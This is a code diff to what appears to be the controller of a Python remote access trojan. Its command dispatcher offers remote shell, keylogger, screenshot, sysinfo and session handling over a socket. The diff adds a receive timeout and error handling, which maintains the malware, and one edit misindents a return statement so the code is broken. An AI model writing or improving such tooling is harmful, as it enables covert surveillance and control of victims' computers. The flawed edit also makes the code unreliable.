@@ -294,14 +294,16 @@ class CLIENT:
         self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))
 
     def recv_data(self):
+        start_time = time.time()  # Record the start time
         while not self.MESSAGE:
             try:
-                pass
+                if time.time() - start_time > 10:  # Check if 10 seconds have passed
+                    raise TimeoutError("No message received within 10 seconds")
             except KeyboardInterrupt:
                 break
         rtval = self.MESSAGE
         self.MESSAGE = ""
-        return rtval
+    return rtval
 
 class COMMCENTER:
 
@@ -526,28 +528,32 @@ class INTERFACE(COMMCENTER):
 
     def execute(self, vals):
         if vals:
-            if vals[0] == "exit":
-                self.c_exit()
-            elif vals[0] == "help":
-                self.c_help(vals)
-            elif vals[0] == "sessions":
-                self.c_sessions()
-            elif vals[0] == "ping":
-                self.c_ping(vals)
-            elif vals[0] == "connect":
-                self.c_connect(vals)
-            elif vals[0] == "disconnect":
-                self.c_disconnect()
-            elif vals[0] == "shell":
-                self.c_shell()
-            elif vals[0] == "clear":
-                self.c_clear()
-            elif vals[0] == "keylogger":
-                self.c_keylogger(vals)
-            elif vals[0] == "sysinfo":
-                self.c_sysinfo()
-            elif vals[0] == "screenshot":
-                self.c_screenshot()
+            try:
+                if vals[0] == "exit":
+                    self.c_exit()
+                elif vals[0] == "help":
+                    self.c_help(vals)
+                elif vals[0] == "sessions":
+                    self.c_sessions()
+                elif vals[0] == "ping":
+                    self.c_ping(vals)
+                elif vals[0] == "connect":
+                    self.c_connect(vals)
+                elif vals[0] == "disconnect":
+                    self.c_disconnect()
+                elif vals[0] == "shell":
+                    self.c_shell()
+                elif vals[0] == "clear":
+                    self.c_clear()
+                elif vals[0] == "keylogger":
+                    self.c_keylogger(vals)
+                elif vals[0] == "sysinfo":
+                    self.c_sysinfo()
+                elif vals[0] == "screenshot":
+                    self.c_screenshot()
+            except Exception as e:
+                # failed execution
+                pull.error("Failed to execute command!")
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
